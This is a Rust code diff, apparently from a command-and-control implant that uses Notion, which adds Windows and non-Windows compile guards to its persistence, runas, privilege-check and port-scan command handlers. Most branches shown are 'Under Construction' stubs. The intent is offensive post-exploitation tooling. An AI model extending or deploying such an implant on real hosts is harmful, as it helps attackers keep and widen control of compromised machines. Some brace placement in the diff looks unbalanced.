@@ -211,7 +211,7 @@ impl NotionCommand {
                 Ok(format!("Config file saved to {s}").to_string())
             },
             CommandType::Persist(s) => {
-                //#[cfg(windows)]
+                #[cfg(windows)]
                 // `persist [method] [args]`
                 match s.trim() {
                     "startup" => {
@@ -291,21 +291,32 @@ impl NotionCommand {
                         return Ok("Under Construction".to_string());
 
                     },
-
-                    _ => Ok("That's not a persistence method!".to_string())                    
+                    _ => Ok("That's not a persistence method!".to_string())
+                    }
+                    #[cfg(not(windows))]{
+                    return Ok("Linux persisternce under Construction".to_string());
                 }
-        
             },
             CommandType::Runas(s) => {
                 // TODO: Implement
+                #[cfg(windows)] {
                 return Ok(String::from("Under Construction!"))
+            }
+                #[cfg(not(windows))] {
+                    return Ok(String::from("Runas only works on Windows!"))
+                }
+
             },
             CommandType::Getprivs => {
                 // TODO: Implement Linux check
-                let is_admin = is_elevated::is_elevated();
+                #[cfg(windows)] {
+                let is_admin = is_elevated::is_elevated();  
                 println!("{}", is_admin);
-
                 Ok(String::from(format!("Admin Context: {is_admin}").to_string()))
+                }
+                #[cfg(not(windows))] {
+                Ok(String::from(format!("Under Construction!").to_string()))
+            }
             },
 
             CommandType::Portscan(s) => {
